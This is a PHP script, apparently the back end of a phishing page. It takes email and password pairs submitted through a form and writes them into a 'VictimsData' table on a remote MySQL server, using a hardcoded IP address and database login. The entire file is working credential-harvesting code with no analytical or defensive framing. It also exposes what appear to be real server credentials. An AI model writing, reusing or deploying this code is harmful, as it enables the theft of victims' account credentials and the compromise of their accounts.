<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Retrieve form data
        $email = $_POST['email'];
        $password = $_POST['password'];
        
        // Connect to your MySQL database
        $servername = "45.83.40.161";//kamtaka server ip
        $username = "ProToAll";//sql server info
        $password = "Naorco576!";
        $dbname = "ControlPanel";
        
        $conn = new mysqli($servername, $username, $password, $dbname);
        
        // Check connection
        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }
        
        // Prepare SQL statement to insert data into the table
    // Prepare SQL statement with placeholders
    $sql = "INSERT INTO VictimsData (email, password) VALUES (?, ?)";

    $stmt = $conn->prepare($sql);

    // bind parameters
    $stmt->bind_param("ss", $email, $password);

    $email = $_POST['email'];
    $password = $_POST['password'];
    $stmt->execute();

    // Check for errors
    if ($stmt->error) {
        echo "Error: " . $stmt->error;
    } else {
        echo "New record created successfully";
    }

    // Close statement
    $stmt->close();
}
?>
